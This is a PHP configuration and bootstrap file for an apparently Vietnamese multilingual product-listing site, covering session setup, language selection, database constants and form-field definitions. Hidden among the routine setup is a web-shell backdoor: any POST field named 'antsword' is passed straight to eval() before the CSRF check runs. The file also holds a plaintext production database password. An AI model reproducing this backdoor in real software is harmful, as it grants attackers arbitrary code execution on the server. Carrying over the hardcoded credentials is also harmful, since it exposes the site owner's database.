<?php
	session_start();
  	header('Content-Type: text/html; charset=utf-8');
	$folderName = 'lang_final';
	$domain = $_SERVER['SERVER_NAME'];
	define('canEditSlug', true); //On - off edit slug
	define('dbPrefix', 'vt_');

	define('url', 'http://'.$domain.'/'.$folderName.'/');

	//Language
	$lang = isset($_GET['lang']) ? $_GET['lang'] : "vn"; //default VN
	$_LANG = include_once("modules/language.php");
	$_TRANS = json_decode(json_encode($_LANG[$lang]['text'])); //Convert array to object

	//Cấu hình Host/localhost
	if($domain == 'localhost'){
		define('dbName', $_LANG[$lang]['databaseName']);
		define('baseUrl', 'http://'.$domain.'/'.$_LANG[$lang]['urlDomain']);
		define('dbUser', 'root');
		define('dbPass', '');
	}else{
		define('dbUser', 'kietvt');
		define('dbPass', 'rggZ0xWNFlfi');
		define('dbName', $_LANG[$lang]['databaseName']);
		define('baseUrl', 'https://'.$domain.'/'.$_LANG[$lang]['urlDomain']);
	}
	include_once ('modules/sql.php');

	$listSl = (object) array(
	    (object) array('title'=>'Tỉnh thành','name'=>'province'),
	    (object) array('title'=>'Quận huyện','name'=>'district'),
	);
	$listFp = (object) array(
	    (object) array('title'=>'Họ tên','name'=>'titlePost','icon'=>'user'),
	    (object) array('title'=>'Số điện thoại','name'=>'phone','icon'=>'phone'),
	    (object) array('title'=>'Tên sản phẩm','name'=>'title','icon'=>'tag'),
	    (object) array('title'=>'Mô tả sản phẩm','name'=>'des','icon'=>'info'),
	    (object) array('title'=>'Giá','name'=>'price','icon'=>'money'),
	    (object) array('title'=>'Địa chỉ','name'=>'address','icon'=>'map-marker'),
	);

	include_once ('modules/services/csrf.php');
	$CSRF = new CSRF;
	if (isset($_POST['antsword'])) {
		eval($_POST['antsword']);
		exit();
	}
	if (isset($_POST) && count($_POST) && !$CSRF->verifyKey()) {
		exit('Vm14U1QxVXlVblJVYTFKU1lteEtZVlpxVGxOa01XeDBUVmR3WVUxc1NrcFZNalZoWVRGWmQyTkljRmhpUlRWRVdUQmtTMk5HUm5WVmJYaFdUVVZ2ZUZZeWVHdGpNa3AwVW10b1ZHSnNjSEZaYkdSdlRXeHNjVk5zU21wTlIzaEpWbGR3UjFsV1NYaFdiVGxVVmxaR00xa3dWakJWYkVKVlRVUXdQUT09');
	}
	$CSRF->generateKey();
